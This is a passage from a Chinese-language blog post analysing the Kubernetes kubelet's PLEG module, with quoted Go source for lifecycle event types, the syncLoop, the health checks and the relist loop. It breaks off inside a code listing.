<code>pkg/kubelet/pleg/pleg.go</code> 文件：</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// PodLifeCycleEventType define the event type of pod life cycle events.</span></span><br><span class="line"><span class="hljs-keyword">type</span> PodLifeCycleEventType <span class="hljs-keyword">string</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">const</span> (</span><br><span class="line">    <span class="hljs-comment">// ContainerStarted - event type when the new state of container is running.</span></span><br><span class="line">    ContainerStarted PodLifeCycleEventType = <span class="hljs-string">"ContainerStarted"</span></span><br><span class="line">    <span class="hljs-comment">// ContainerDied - event type when the new state of container is exited.</span></span><br><span class="line">    ContainerDied PodLifeCycleEventType = <span class="hljs-string">"ContainerDied"</span></span><br><span class="line">    <span class="hljs-comment">// ContainerRemoved - event type when the old state of container is exited.</span></span><br><span class="line">    ContainerRemoved PodLifeCycleEventType = <span class="hljs-string">"ContainerRemoved"</span></span><br><span class="line">    <span class="hljs-comment">// PodSync is used to trigger syncing of a pod when the observed change of</span></span><br><span class="line">    <span class="hljs-comment">// the state of the pod cannot be captured by any single event above.</span></span><br><span class="line">    PodSync PodLifeCycleEventType = <span class="hljs-string">"PodSync"</span></span><br><span class="line">    <span class="hljs-comment">// ContainerChanged - event type when the new state of container is unknown.</span></span><br><span class="line">    ContainerChanged PodLifeCycleEventType = <span class="hljs-string">"ContainerChanged"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// PodLifecycleEvent is an event that reflects the change of the pod state.</span></span><br><span class="line"><span class="hljs-keyword">type</span> PodLifecycleEvent <span class="hljs-keyword">struct</span> &#123;</span><br><span class="line">    <span class="hljs-comment">// The pod ID.</span></span><br><span class="line">    ID types.UID</span><br><span class="line">    <span class="hljs-comment">// The type of the event.</span></span><br><span class="line">    Type PodLifeCycleEventType</span><br><span class="line">    <span class="hljs-comment">// The accompanied data which varies based on the event type.</span></span><br><span class="line">    <span class="hljs-comment">//   - ContainerStarted/ContainerStopped: the container name (string).</span></span><br><span class="line">    <span class="hljs-comment">//   - All other event types: unused.</span></span><br><span class="line">    Data <span class="hljs-keyword">interface</span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PodLifecycleEvent</code> 结构保存着以下信息：</p><ul><li><p><code>ID</code>: pod ID</p></li><li><p><code>Type</code>: 事件类型</p><p><code>PodLifecycleEventType</code> 有以下几种：</p><ul><li><code>ContainerStarted</code>: 容器状态变为 <code>Running</code></li><li><code>ContainerDied</code>: 容器状态变为 <code>Exited</code></li><li><code>ContainerRemoved</code>: 容器消失</li><li><code>PodSync</code>: PLEG 中未使用</li><li><code>ContainerChanged</code>: 容器状态变为 <code>Unknown</code></li></ul></li><li><p><code>Data</code>: 容器 ID（源码注释是 container name，应该是错误）</p></li></ul><h2 id="PLEG-接口调用"><a href="#PLEG-接口调用" class="headerlink" title="PLEG 接口调用"></a>PLEG 接口调用</h2><p>下面我们看看 kubelet 是在哪里使用 <code>PodLifecycleEventGenerator</code> 接口里的三个方法的。</p><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>kubelet 在 <code>Run</code> 函数中执行 <code>Start</code>，启动 PLEG。</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// Run starts the kubelet reacting to config updates</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(kl *Kubelet)</span> <span class="hljs-title">Run</span><span class="hljs-params">(updates &lt;-<span class="hljs-keyword">chan</span> kubetypes.PodUpdate)</span></span> &#123;</span><br><span class="line">    <span class="hljs-comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Start the pod lifecycle event generator.</span></span><br><span class="line">    kl.pleg.Start()</span><br><span class="line">    kl.syncLoop(updates, kl)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h3><p>最后在 <code>syncLoop</code> 中执行 <code>Watch</code>，获取到这个关键的 channel <code>plegCh</code>，然后在 <code>syncLoopIteration</code> 函数中从 channel 中获取事件，进行处理。</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// syncLoop is the main loop for processing changes. It watches for changes from</span></span><br><span class="line"><span class="hljs-comment">// three channels (file, apiserver, and http) and creates a union of them. For</span></span><br><span class="line"><span class="hljs-comment">// any new change seen, will run a sync against desired state and running state. If</span></span><br><span class="line"><span class="hljs-comment">// no changes are seen to the configuration, will synchronize the last known desired</span></span><br><span class="line"><span class="hljs-comment">// state every sync-frequency seconds. Never returns.</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(kl *Kubelet)</span> <span class="hljs-title">syncLoop</span><span class="hljs-params">(updates &lt;-<span class="hljs-keyword">chan</span> kubetypes.PodUpdate, handler SyncHandler)</span></span> &#123;</span><br><span class="line">    klog.Info(<span class="hljs-string">"Starting kubelet main sync loop."</span>)</span><br><span class="line">    <span class="hljs-comment">// The syncTicker wakes up kubelet to checks if there are any pod workers</span></span><br><span class="line">    <span class="hljs-comment">// that need to be sync'd. A one-second period is sufficient because the</span></span><br><span class="line">    <span class="hljs-comment">// sync interval is defaulted to 10s.</span></span><br><span class="line">    syncTicker := time.NewTicker(time.Second)</span><br><span class="line">    <span class="hljs-keyword">defer</span> syncTicker.Stop()</span><br><span class="line">    housekeepingTicker := time.NewTicker(housekeepingPeriod)</span><br><span class="line">    <span class="hljs-keyword">defer</span> housekeepingTicker.Stop()</span><br><span class="line">    plegCh := kl.pleg.Watch()</span><br><span class="line">    <span class="hljs-comment">// ...</span></span><br><span class="line">    <span class="hljs-keyword">for</span> &#123;</span><br><span class="line">        <span class="hljs-comment">// ...</span></span><br><span class="line">        <span class="hljs-keyword">if</span> !kl.syncLoopIteration(updates, handler, syncTicker.C, housekeepingTicker.C, plegCh) &#123;</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>syncLoopIteration</code> 是 kubelet 事件处理的核心函数，它的职责是从多个不同类型的 channel 中获取事件，然后分发给不同的 handler 去处理。</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// syncLoopIteration reads from various channels and dispatches pods to the</span></span><br><span class="line"><span class="hljs-comment">// given handler.</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(kl *Kubelet)</span> <span class="hljs-title">syncLoopIteration</span><span class="hljs-params">(configCh &lt;-<span class="hljs-keyword">chan</span> kubetypes.PodUpdate, handler SyncHandler,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">    syncCh &lt;-<span class="hljs-keyword">chan</span> time.Time, housekeepingCh &lt;-<span class="hljs-keyword">chan</span> time.Time, plegCh &lt;-<span class="hljs-keyword">chan</span> *pleg.PodLifecycleEvent)</span> <span class="hljs-title">bool</span></span> &#123;</span><br><span class="line">    <span class="hljs-keyword">select</span> &#123;</span><br><span class="line">    <span class="hljs-keyword">case</span> u, open := &lt;-configCh:</span><br><span class="line">        <span class="hljs-comment">// ...</span></span><br><span class="line">    <span class="hljs-keyword">case</span> e := &lt;-plegCh:</span><br><span class="line">        <span class="hljs-keyword">if</span> isSyncPodWorthy(e) &#123;</span><br><span class="line">            <span class="hljs-comment">// PLEG event for a pod; sync it.</span></span><br><span class="line">            <span class="hljs-keyword">if</span> pod, ok := kl.podManager.GetPodByUID(e.ID); ok &#123;</span><br><span class="line">                klog.V(<span class="hljs-number">2</span>).Infof(<span class="hljs-string">"SyncLoop (PLEG): %q, event: %#v"</span>, format.Pod(pod), e)</span><br><span class="line">                handler.HandlePodSyncs([]*v1.Pod&#123;pod&#125;)</span><br><span class="line">            &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">                <span class="hljs-comment">// If the pod no longer exists, ignore the event.</span></span><br><span class="line">                klog.V(<span class="hljs-number">4</span>).Infof(<span class="hljs-string">"SyncLoop (PLEG): ignore irrelevant event: %#v"</span>, e)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> e.Type == pleg.ContainerDied &#123;</span><br><span class="line">            <span class="hljs-keyword">if</span> containerID, ok := e.Data.(<span class="hljs-keyword">string</span>); ok &#123;</span><br><span class="line">                kl.cleanUpContainersInPod(e.ID, containerID)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="hljs-keyword">case</span> &lt;-syncCh:</span><br><span class="line">        <span class="hljs-comment">// ...</span></span><br><span class="line">    <span class="hljs-keyword">case</span> update := &lt;-kl.livenessManager.Updates():</span><br><span class="line">        <span class="hljs-comment">// ...</span></span><br><span class="line">    <span class="hljs-keyword">case</span> &lt;-housekeepingCh:</span><br><span class="line">        <span class="hljs-comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>configCh</code> 负责获取 pod 配置更新事件。</li><li><code>syncCh</code> 是一个定时器，定时获取 pod sync 事件，对需要的 pod 进行同步，默认是 <code>1s</code>。</li><li><code>housekeepingCh</code> 也是一个定时器，定时获取 pod Cleanup 事件，对需要的 pod 进行清理，默认值是 <code>2s</code></li><li><code>plegCh</code> 负责获取 pod lifecycle 事件</li><li><code>livenessManager.Updates</code> 负责获取 liveness probe 事件</li><li><code>handler</code> 是个事件处理接口 (<code>SyncHandler</code>)，获取到上面的时间后调用对应的事件处理方法，kubelet 主类本身默认实现了这个接口。</li></ul><p>在这里我们只关心对 pod lifecycle 事件的处理：从代码上看，kubelet 收到 pod lifecycle 事件之后，首先判断事件类型是不是值得触发 pod 同步，如果是 <code>ContainerRemoved</code>，则忽略该事件。如果是其他事件，且 pod 信息还没有被删除，调用 <code>HandlePodSyncs</code> 产生 UpdatePod 事件，交给 kubelet pod Worker 进行异步更新。最后，如果是 <code>ContainerDied</code> 事件，为了防止退出容器堆积，会按照一定的策略移除已退出的容器。</p><h3 id="健康检测"><a href="#健康检测" class="headerlink" title="健康检测"></a>健康检测</h3><p>kubelet 对 PLEG 模块的健康检测，通过 runtimeState 来管理，kubelet 在初始化 PLEG 后通过 <code>addHealthCheck</code> 将 <code>klet.pleg.Healthy</code> 健康监测方法注册至 runtimeState，runtimeState 定时调用 <code>Healthy</code> 方法检查 PLEG 的健康状态。参见 <code>pkg/kubelet/kubelet.go</code>：</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewMainKubelet</span><span class="hljs-params">(...)</span> <span class="hljs-params">(*Kubelet, error)</span></span> &#123;</span><br><span class="line">    <span class="hljs-comment">// ...</span></span><br><span class="line">    klet.runtimeState.addHealthCheck(<span class="hljs-string">"PLEG"</span>, klet.pleg.Healthy)</span><br><span class="line">    <span class="hljs-comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>addHealthCheck</code> 实现在 <code>pkg/kubelet/runtime.go</code> 中：</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *runtimeState)</span> <span class="hljs-title">addHealthCheck</span><span class="hljs-params">(name <span class="hljs-keyword">string</span>, f healthCheckFnType)</span></span> &#123;</span><br><span class="line">    s.Lock()</span><br><span class="line">    <span class="hljs-keyword">defer</span> s.Unlock()</span><br><span class="line">    s.healthChecks = <span class="hljs-built_in">append</span>(s.healthChecks, &amp;healthCheck&#123;name: name, fn: f&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在 <code>syncLoop</code> 中定时执行 <code>runtimeErrors</code>，这里 <code>syncLoop</code> 采用了简单的 backoff 机制，如果 runtimeState 各个模块状态都正常，则每次循环默认 sleep <code>100ms</code>，如果出现异常状态，则 sleep duration * 2，最大变为 <code>5s</code>，参见 <code>pkg/kubelet/kubelet.go</code>：</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(kl *Kubelet)</span> <span class="hljs-title">syncLoop</span><span class="hljs-params">(updates &lt;-<span class="hljs-keyword">chan</span> kubetypes.PodUpdate, handler SyncHandler)</span></span> &#123;</span><br><span class="line">    klog.Info(<span class="hljs-string">"Starting kubelet main sync loop."</span>)</span><br><span class="line">    <span class="hljs-comment">// ...</span></span><br><span class="line">    <span class="hljs-keyword">const</span> (</span><br><span class="line">        base   = <span class="hljs-number">100</span> * time.Millisecond</span><br><span class="line">        max    = <span class="hljs-number">5</span> * time.Second</span><br><span class="line">        factor = <span class="hljs-number">2</span></span><br><span class="line">    )</span><br><span class="line">    duration := base</span><br><span class="line">    <span class="hljs-keyword">for</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">if</span> err := kl.runtimeState.runtimeErrors(); err != <span class="hljs-literal">nil</span> &#123;</span><br><span class="line">            klog.Infof(<span class="hljs-string">"skipping pod synchronization - %v"</span>, err)</span><br><span class="line">            <span class="hljs-comment">// exponential backoff</span></span><br><span class="line">            time.Sleep(duration)</span><br><span class="line">            duration = time.Duration(math.Min(<span class="hljs-keyword">float64</span>(max), factor*<span class="hljs-keyword">float64</span>(duration)))</span><br><span class="line">            <span class="hljs-keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-comment">// reset backoff if we have a success</span></span><br><span class="line">        duration = base</span><br><span class="line">        <span class="hljs-comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>runtimeErrors</code> 实现在 <code>pkg/kubelet/runtime.go</code> 中：</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *runtimeState)</span> <span class="hljs-title">runtimeErrors</span><span class="hljs-params">()</span> <span class="hljs-title">error</span></span> &#123;</span><br><span class="line">    s.RLock()</span><br><span class="line">    <span class="hljs-keyword">defer</span> s.RUnlock()</span><br><span class="line">    errs := []error&#123;&#125;</span><br><span class="line">    <span class="hljs-comment">// ...</span></span><br><span class="line">    <span class="hljs-keyword">for</span> _, hc := <span class="hljs-keyword">range</span> s.healthChecks &#123;</span><br><span class="line">        <span class="hljs-keyword">if</span> ok, err := hc.fn(); !ok &#123;</span><br><span class="line">            errs = <span class="hljs-built_in">append</span>(errs, fmt.Errorf(<span class="hljs-string">"%s is not healthy: %v"</span>, hc.name, err))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> utilerrors.NewAggregate(errs)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里也是依次执行各个模块事先注册的 healthy check 函数，如果任何一个模块返回 false，则认为整个 runtimeState 的状态为 unhealthy。</p><h2 id="Generic-PLEG-实现"><a href="#Generic-PLEG-实现" class="headerlink" title="Generic PLEG 实现"></a>Generic PLEG 实现</h2><p>我们再回到 <code>PodLifecycleEventGenerator</code> 接口的实现 —— <code>GenericPLEG</code> 的定义，见 <code>pkg/kubelet/pleg/generic.go</code> 文件：</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">type</span> GenericPLEG <span class="hljs-keyword">struct</span> &#123;</span><br><span class="line">    <span class="hljs-comment">// The period for relisting.</span></span><br><span class="line">    relistPeriod time.Duration</span><br><span class="line">    <span class="hljs-comment">// The container runtime.</span></span><br><span class="line">    runtime kubecontainer.Runtime</span><br><span class="line">    <span class="hljs-comment">// The channel from which the subscriber listens events.</span></span><br><span class="line">    eventChannel <span class="hljs-keyword">chan</span> *PodLifecycleEvent</span><br><span class="line">    <span class="hljs-comment">// The internal cache for pod/container information.</span></span><br><span class="line">    podRecords podRecords</span><br><span class="line">    <span class="hljs-comment">// Time of the last relisting.</span></span><br><span class="line">    relistTime atomic.Value</span><br><span class="line">    <span class="hljs-comment">// Cache for storing the runtime states required for syncing pods.</span></span><br><span class="line">    cache kubecontainer.Cache</span><br><span class="line">    <span class="hljs-comment">// For testability.</span></span><br><span class="line">    clock clock.Clock</span><br><span class="line">    <span class="hljs-comment">// Pods that failed to have their status retrieved during a relist. These pods will be</span></span><br><span class="line">    <span class="hljs-comment">// retried during the next relisting.</span></span><br><span class="line">    podsToReinspect <span class="hljs-keyword">map</span>[types.UID]*kubecontainer.Pod</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>relistPeriod</code> 是 PLEG 检测周期，默认为 <code>1s</code></li><li><code>runtime</code> 是 container runtime，负责获取 pod 和 container 的状态信息</li><li><code>podRecords</code> 缓存 pod 以及 Container 的基本信息</li><li><code>cache</code> 缓存 pod 的运行时状态</li><li><code>eventChannel</code> 是 PLEG 通过对比 pod 缓存信息和当前信息，生成 pod lifecycle events 的 channel</li><li><code>relistTime</code> 是上一次执行完 PLEG 检测的时刻</li><li><code>podsToReinspect</code> 保存 PLEG 检测失败的 Pod，以便下次再次检测</li><li><code>clock</code> 是一个时间管理对象，作用是获取当前时间</li></ul><p>然后我们基于接口方法，来分析 <code>GenericPLEG</code> 的实现：</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// Start spawns a goroutine to relist periodically.</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(g *GenericPLEG)</span> <span class="hljs-title">Start</span><span class="hljs-params">()</span></span> &#123;</span><br><span class="line">    <span class="hljs-keyword">go</span> wait.Until(g.relist, g.relistPeriod, wait.NeverStop)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Start</code> 启动了一个 goroutine，以 <code>1s</code> 的间隔无限执行 <code>relist</code> 函数。这里要注意 <code>wait.Until</code> 的行为，如果 <code>relist</code> 执行时间大于 period 设置的值，则时间窗会滑动至 relist 执行完毕的那一时刻。也就是说如果 period 是 <code>1s</code>，relist 从第 <code>0s</code> 开始，花了 <code>10s</code>，结束时是第 <code>10s</code>，那么下一次 relist 会从第 <code>11s</code> 开始执行。</p><p>relist 函数的实现如下：</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// relist queries the container runtime for list of pods/containers, compare</span></span><br><span class="line"><span class="hljs-comment">// with the internal pods/containers, and generates events accordingly.</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(g *GenericPLEG)</span> <span class="hljs-title">relist</span><span class="hljs-params">()</span></span> &#123;</span><br><span class="line">    klog.V(<span class="hljs-number">5</span>).Infof(<span class="hljs-string">"GenericPLEG: Relisting"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> lastRelistTime := g.getRelistTime(); !lastRelistTime.IsZero() &#123;</span><br><span class="line">        metrics.PLEGRelistInterval.Observe(metrics.SinceInSeconds(lastRelistTime))</span><br><span class="line">        metrics.DeprecatedPLEGRelistInterval.Observe(metrics.SinceInMicroseconds(lastRelistTime))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    timestamp := g.clock.Now()</span><br><span class="line">    <span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;</span><br><span class="line">        metrics.PLEGRelistDuration.Observe(metrics.SinceInSeconds(timestamp))</span><br><span class="line">        metrics.DeprecatedPLEGRelistLatency.Observe(metrics.SinceInMicroseconds(timestamp))</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Get all the pods.</span></span><br><span class="line">    podList, err := g.runtime.GetPods(<span class="hljs-literal">true</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;</span><br><span class="line">        klog.Errorf(<span class="hljs-string">"GenericPLEG: Unable to retrieve pods: %v"</span>, err)</span><br><span class="line">        <span class="hljs-keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    g.updateRelistTime(timestamp)</span><br><span class="line"></span><br><span class="line">    pods := kubecontainer.Pods(podList)</span><br><span class="line">    g.podRecords.setCurrent(pods)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// Compare the old and the current pods, and generate events.</span></span><br><span class="line">    eventsByPodID := <span class="hljs-keyword">map</span>[types.UID][]*PodLifecycleEvent&#123;&#125;</span><br><span class="line">    <span class="hljs-keyword">for</span> pid := <span class="hljs-keyword">range</span> g.podRecords &#123;</span><br><span class="line">        oldPod := g.podRecords.getOld(pid)</span><br><span class="line">        pod := g.podRecords.getCurrent(pid)</span><br><span class="line">        <span class="hljs-comment">// Get all containers in the old and the new pod.</span></span><br><span class="line">        allContainers := getContainersFromPods(oldPod, pod)</span><br><span class="line">        <span class="hljs-keyword">for</span> _, container := <span class="hljs-keyword">range</span> allContainers &#123;</span><br><span class="line">            events := computeEvents(oldPod, pod, &amp;container.ID)</span><br><span class="line">            <span class="hljs-keyword">for</span> _, e := <span class="hljs-keyword">range</span> events &#123;</span><br><span class="line">                updateEvents(eventsByPodID, e)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">var</span> needsReinspection <span class="hljs-keyword">map</span>[types.UID]*kubecontainer.Pod</span><br><span class="line">    <span class="hljs-keyword">if</span> g.cacheEnabled() &#123;</span><br><span class="line">        needsReinspection = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[types.UID]*kubecontainer.Pod)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// If there are events associated with a pod, we should update the</span></span><br><span class="line">    <span class="hljs-comment">// podCache.</span></span><br><span class="line">    <span class="hljs-keyword">for</span> pid, events := <span class="hljs-keyword">range</span> eventsByPodID &#123;</span><br><span class="line">        pod := g.podRecords.getCurrent(pid)</span><br><span class="line">        <span class="hljs-keyword">if</span> g.cacheEnabled() &#123;</span><br><span class="line">            <span class="hljs-comment">// updateCache() will inspect the pod and update the cache. If an</span></span><br><span class="line">            <span class="hljs-comment">// error occurs during the inspection, we want PLEG to retry again</span></span><br><span class="line">            <span class="hljs-comment">// in the next relist. To achieve this, we do not update the</span></span><br><span class="line">            <span class="hljs-comment">// associated podRecord of the pod, so that the change will be</span></span><br><span class="line">            <span class="hljs-comment">// detect again in the next relist.</span></span><br><span class="line">            <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> If many pods changed during the same relist period,</span></span><br><span class="line">            <span class="hljs-comment">// inspecting the pod and getting the PodStatus to update the cache</span></span><br><span class="line">            <span class="hljs-comment">// serially may take a while. We should be aware of this and</span></span><br><span class="line">            <span class="hljs-comment">// parallelize if needed.</span></span><br><span class="line">            <span class="hljs-keyword">if</span> err := g.updateCache(pod, pid); err != <span class="hljs-literal">nil</span> &#123;</span><br><span class="line">                <span class="hljs-comment">// Rely on updateCache calling GetPodStatus to log the actual error.</span></span><br><span 